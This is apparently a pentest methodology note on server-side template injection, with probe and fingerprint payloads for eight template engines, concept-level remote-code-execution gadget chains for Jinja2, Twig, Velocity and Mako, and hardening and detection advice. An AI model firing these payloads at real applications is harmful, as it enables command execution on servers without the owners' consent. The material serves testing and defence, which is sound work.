# Server-side template injection — methodology

## Probe → fingerprint → exploit

| Step | Action |
|------|--------|
| Probe | `{{7*7}}` — does the response contain `49`? |
| Fingerprint | Try engine-specific syntax once probe confirms |
| Exploit | Engine-specific gadget chain for RCE |

## Engine fingerprints

| Engine | Probe that distinguishes |
|--------|--------------------------|
| Jinja2 (Python) | `{{7*'7'}}` → `7777777` |
| Twig (PHP) | `{{7*'7'}}` → `49` (Twig coerces) |
| Mako (Python) | `${7*7}` → `49`; `${"7"*7}` → `7777777` |
| Velocity (Java) | `#set($x=7*7)$x` → `49` |
| Freemarker (Java) | `${7*7}` → `49`; `${"freemarker.template.utility.Execute"?new()}` |
| Smarty (PHP) | `{$smarty.version}` returns version |
| Tornado (Python) | `{{handler.settings}}` returns dict |
| Pug / Jade (Node) | `#{7*7}` → `49` |

## Common RCE gadgets (concept-level)

- **Jinja2:** `{{ ''.__class__.__mro__[1].__subclasses__() }}` → find subprocess class →
  call `__init__.__globals__['os'].popen('id').read()`.
- **Twig (PHP):** `{{ _self.env.registerUndefinedFilterCallback("exec") }}` then call.
- **Velocity:** ScriptEngine via `$class.inspect("java.lang.Runtime")`.
- **Mako:** `${ exec("id") }` directly if exec is in scope.

These chains depend on sandbox settings. Many real apps disable the worst of them.

## Hardening

- Sandbox the template engine. Jinja2's `SandboxedEnvironment`, Twig's sandbox extension.
- Treat templates as code: only authorized developers commit them; user input is data, never
  template source.
- For user-customizable email / report templates, use a templating language with no code
  execution at all (Mustache / Handlebars without helpers).

## Detection

- High-entropy parameter values containing `{{`, `${`, `<%`, `#{` from external traffic.
- Template error / exception in logs.

## References

- PortSwigger — SSTI labs (canonical).
- James Kettle — *Server-side template injection: RCE for the modern web* (BlackHat 2015).
- HackTricks — SSTI cheat sheet.
